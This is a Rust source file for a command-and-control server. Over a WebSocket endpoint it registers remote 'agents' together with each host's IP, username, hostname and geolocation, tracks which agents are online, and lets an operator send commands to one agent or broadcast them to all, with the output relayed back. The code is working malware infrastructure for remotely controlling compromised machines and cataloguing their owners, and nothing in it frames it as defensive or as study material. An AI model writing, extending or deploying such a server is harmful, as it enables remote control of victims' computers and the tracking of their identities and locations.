use crate::handlers::models::{Agent, C2Message};
use futures::{SinkExt, StreamExt};
use sqlx::{Pool, Postgres};
use std::collections::HashMap;
use std::sync::{Arc, Mutex};
use std::time::Duration;
use tokio::sync::mpsc;
use tokio::time;
use warp::Filter;
use warp::ws::{Message, WebSocket};

pub struct ServerState {
    pub agents: HashMap<String, mpsc::Sender<Message>>, // Agentes registrados
    pub clients: HashMap<String, mpsc::Sender<Message>>, // Todas as conexões (agentes e operadores)
    pub db: Pool<Postgres>,
}

impl ServerState {
    pub fn new(db: Pool<Postgres>) -> Self {
        ServerState {
            agents: HashMap::new(),
            clients: HashMap::new(),
            db,
        }
    }
}

pub async fn start_server(db: Pool<Postgres>) {
    let state = Arc::new(Mutex::new(ServerState::new(db)));
    let state_filter = warp::any().map(move || state.clone());

    let ws_route =
        warp::path("c2")
            .and(warp::ws())
            .and(state_filter)
            .map(|ws: warp::ws::Ws, state| {
                ws.on_upgrade(move |socket| handle_connection(socket, state))
            });

    println!("Server running on ws://0.0.0.0:80/c2");

    warp::serve(ws_route).run(([0, 0, 0, 0], 80)).await;
}

async fn update_agent_status(
    state: &Arc<Mutex<ServerState>>,
    uuid: &str,
    online: bool,
) -> Result<(), sqlx::Error> {
    let db = state.lock().unwrap().db.clone();
    sqlx::query("UPDATE agents SET online = $1 WHERE uuid = $2")
        .bind(online)
        .bind(uuid)
        .execute(&db)
        .await?;
    Ok(())
}

async fn handle_ws_message(
    state: &Arc<Mutex<ServerState>>,
    uuid: &String,
    c2_msg: C2Message,
    operator_tx: &mpsc::Sender<Message>,
) {
    match c2_msg {
        C2Message::Pong => {
            if let Err(e) = update_agent_status(state, uuid, true).await {
                eprintln!("Error updating agent status for {}: {}", uuid, e);
            }
            let response = serde_json::to_string(&C2Message::AgentStatus {
                uuid: uuid.to_string(),
                online: true,
            })
            .unwrap();
            let senders = {
                let state = state.lock().unwrap();
                state.clients.values().cloned().collect::<Vec<_>>() // Enviar para todos os clientes
            };
            for sender in senders {
                let _ = sender.send(Message::text(response.clone())).await;
            }
        }
        C2Message::AgentRegister {
            uuid,
            ip,
            username,
            hostname,
            country,
            city,
            region,
            latitude,
            longitude,
        } => {
            eprintln!("Registering agent {}", uuid);
            let db = {
                let state = state.lock().unwrap();
                state.db.clone()
            };
            let result = sqlx::query(
                "INSERT INTO agents (uuid, ip, username, hostname, country, city, region, latitude, longitude, online) 
                 VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, true) 
                 ON CONFLICT (uuid) DO UPDATE SET
                    ip = EXCLUDED.ip,
                    username = EXCLUDED.username,
                    hostname = EXCLUDED.hostname,
                    country = EXCLUDED.country,
                    city = EXCLUDED.city,
                    region = EXCLUDED.region,
                    latitude = EXCLUDED.latitude,
                    longitude = EXCLUDED.longitude,
                    online = true",
            )
            .bind(&uuid)
            .bind(&ip)
            .bind(&username)
            .bind(&hostname)
            .bind(&country)
            .bind(&city)
            .bind(&region)
            .bind(latitude)
            .bind(longitude)
            .execute(&db)
            .await;
            if let Err(e) = result {
                eprintln!("Error registering agent {}: {}", uuid, e);
            }
        }
        C2Message::RequestAgentList => {
            let db = {
                let state = state.lock().unwrap();
                state.db.clone()
            };
            let agents = sqlx::query_as::<_, Agent>("SELECT * FROM agents")
                .fetch_all(&db)
                .await
                .unwrap_or_default();
            let total_agents = agents.len();
            let online_agents = agents.iter().filter(|agent| agent.online).count();
            let response = serde_json::to_string(&C2Message::AgentList {
                agents,
                total: total_agents,
                online: online_agents,
            })
            .map_err(|e| format!("Failed to serialize response: {}", e))
            .expect("Failed to retrieve response.");
            let _ = operator_tx.send(Message::text(response)).await;
        }
        C2Message::RequestAgentDetails { identifier } => {
            let db = {
                let state = state.lock().unwrap();
                state.db.clone()
            };
            let agent = if let Ok(id) = identifier.parse::<i32>() {
                sqlx::query_as::<_, Agent>("SELECT * FROM agents WHERE id = $1")
                    .bind(id)
                    .fetch_optional(&db)
                    .await
                    .unwrap_or(None)
            } else {
                sqlx::query_as::<_, Agent>("SELECT * FROM agents WHERE uuid = $1")
                    .bind(&identifier)
                    .fetch_optional(&db)
                    .await
                    .unwrap_or(None)
            };
            let response = serde_json::to_string(&C2Message::AgentDetails { agent }).unwrap();
            let _ = operator_tx.send(Message::text(response)).await;
        }
        C2Message::Command { uuid, cmd } => {
            let agent_sender = {
                let state = state.lock().unwrap();
                state.agents.get(&uuid).cloned()
            };
            if let Some(agent_sender) = agent_sender {
                let command_msg = serde_json::to_string(&C2Message::Command { uuid, cmd }).unwrap();
                let _ = agent_sender.send(Message::text(command_msg)).await;
            } else {
                eprintln!("Agent {} not found for command", uuid);
            }
        }
        C2Message::Broadcast { cmd } => {
            let senders = {
                let state = state.lock().unwrap();
                state.agents.values().cloned().collect::<Vec<_>>()
            };
            let broadcast_msg = serde_json::to_string(&C2Message::Broadcast { cmd }).unwrap();
            for sender in senders {
                let _ = sender.send(Message::text(broadcast_msg.clone())).await;
            }
        }
        C2Message::CommandResponse { output } => {
            let senders = {
                let state = state.lock().unwrap();
                state.clients.values().cloned().collect::<Vec<_>>() // Enviar para todos os clientes
            };
            let response_msg =
                serde_json::to_string(&C2Message::CommandResponse { output }).unwrap();
            for sender in senders {
                let _ = sender.send(Message::text(response_msg.clone())).await;
            }
        }
        _ => {}
    }
}

async fn handle_connection(ws: WebSocket, state: Arc<std::sync::Mutex<ServerState>>) {
    let (mut ws_sender, mut ws_receiver) = ws.split();
    let (tx, mut rx) = mpsc::channel::<Message>(100);
    let client_id = uuid::Uuid::new_v4().to_string(); // ID único para cada conexão

    // Register the client (agent or operator)
    {
        let mut state = state.lock().unwrap();
        state.clients.insert(client_id.clone(), tx.clone());
        eprintln!("New client connected: {}", client_id);
    }

    let mut uuid: Option<String> = None; // UUID do agente, se for um agente

    let uuid_ws = match ws_receiver.next().await {
        Some(Ok(msg)) => {
            if let Ok(text) = msg.to_str() {
                if let Ok(c2_msg) = serde_json::from_str::<C2Message>(text) {
                    if let C2Message::AgentRegister {
                        uuid: agent_uuid,
                        ip,
                        username,
                        hostname,
                        country,
                        city,
                        region,
                        latitude,
                        longitude,
                    } = c2_msg
                    {
                        {
                            let mut state = state.lock().unwrap();
                            state.agents.insert(agent_uuid.clone(), tx.clone());
                        }

                        if let Err(e) = update_agent_status(&state, &agent_uuid, true).await {
                            eprintln!(
                                "Error updating agent status for {} to online: {}",
                                agent_uuid, e
                            );
                        } else {
                            eprintln!("Agent {} status updated to online in database.", agent_uuid);
                        }

                        uuid = Some(agent_uuid.clone());
                        Some(agent_uuid)
                    } else {
                        Some(client_id.clone()) // Use client_id if not an agent
                    }
                } else {
                    Some(client_id.clone())
                }
            } else {
                Some(client_id.clone())
            }
        }
        Some(Err(e)) => {
            eprintln!("Error receiving AgentRegister message: {}", e);
            if e.to_string().contains("Broken pipe") {
                eprintln!("Detected broken pipe or connection closed during registration");
            }
            None
        }
        None => {
            eprintln!("Connection closed before receiving AgentRegister message");
            None
        }
    };

    let uuid_ws = match uuid_ws {
        Some(uuid) => uuid,
        None => {
            // limpa o cliente dps de desconectar
            {
                let mut state = state.lock().unwrap();
                state.clients.remove(&client_id);
                eprintln!("Client {} disconnected during registration", client_id);
            }
            return;
        }
    };

    let uuid_heartbeat = uuid_ws.clone();
    let local_uuid_var = uuid_ws.clone();

    let state_clone_for_send = state.clone();
    let send_task = tokio::spawn(async move {
        while let Some(msg) = rx.recv().await {
            if let Err(e) = ws_sender.send(msg).await {
                eprintln!("Error sending message to client {}: {}", &local_uuid_var, e);
                if e.to_string().contains("Broken pipe") {
                    eprintln!(
                        "Detected broken pipe or connection closed for client {}",
                        &local_uuid_var
                    );
                    if let Err(e) =
                        update_agent_status(&state_clone_for_send, &local_uuid_var, false).await
                    {
                        eprintln!(
                            "Error updating agent status for {} to offline: {}",
                            &local_uuid_var, e
                        );
                    } else {
                        eprintln!(
                            "Agent {} status updated to offline in database.",
                            &local_uuid_var
                        );
                    }
                }
                return Err(e.to_string());
            }
        }
        if let Err(e) = ws_sender.close().await {
            eprintln!(
                "Error closing WebSocket for client {}: {}",
                &local_uuid_var, e
            );
        }
        Ok::<(), String>(())
    });

    let state_clone = state.clone();
    let tx_clone = tx.clone();
    let heartbeat_task = tokio::spawn(async move {
        let mut interval = time::interval(Duration::from_secs(30));
        loop {
            interval.tick().await;
            let ping = serde_json::to_string(&C2Message::Ping)
                .map_err(|e| format!("Serialization error: {}", e))?;
            if tx_clone.send(Message::text(ping)).await.is_err() {
                eprintln!(
                    "Failed to send ping to client {}. Assuming disconnection.",
                    &uuid_heartbeat
                );
                break;
            }
        }
        Ok::<(), String>(())
    });

    while let Some(result) = ws_receiver.next().await {
        match result {
            Ok(msg) => {
                if let Ok(text) = msg.to_str() {
                    if let Ok(c2_msg) = serde_json::from_str::<C2Message>(text) {
                        let state_clone = state.clone();
                        handle_ws_message(&state_clone, &uuid_ws, c2_msg, &tx).await;
                    }
                }
            }
            Err(e) => {
                eprintln!("Error receiving message for client {}: {}", &uuid_ws, e);
                if e.to_string().contains("Broken pipe") {
                    eprintln!(
                        "Detected broken pipe or connection closed for client {}",
                        &uuid_ws
                    );
                }
                break;
            }
        }
    }

    {
        let mut state = state.lock().unwrap();
        state.clients.remove(&uuid_ws);
        if let Some(agent_uuid) = uuid {
            state.agents.remove(&agent_uuid);
            eprintln!(
                "Agent {} disconnected and removed from active agents.",
                agent_uuid
            );
        }
        eprintln!(
            "Client {} disconnected and removed from active clients.",
            uuid_ws
        );
    }

    if let Err(e) = update_agent_status(&state, &uuid_ws, false).await {
        eprintln!(
            "Error updating agent status for {} to offline: {}",
            uuid_ws, e
        );
    } else {
        eprintln!("Agent {} status updated to offline in database.", uuid_ws);
    }

    let response = serde_json::to_string(&C2Message::AgentStatus {
        uuid: uuid_ws.clone(),
        online: false,
    })
    .map_err(|e| format!("Serialization error: {}", e))
    .unwrap();
    let senders = {
        let state = state.lock().unwrap();
        state.clients.values().cloned().collect::<Vec<_>>()
    };
    for sender in senders {
        if let Err(e) = sender.send(Message::text(response.clone())).await {
            eprintln!(
                "Error notifying clients of status change for {}: {}",
                uuid_ws, e
            );
        }
    }

    let _ = send_task.await;
    let _ = heartbeat_task.await;
}
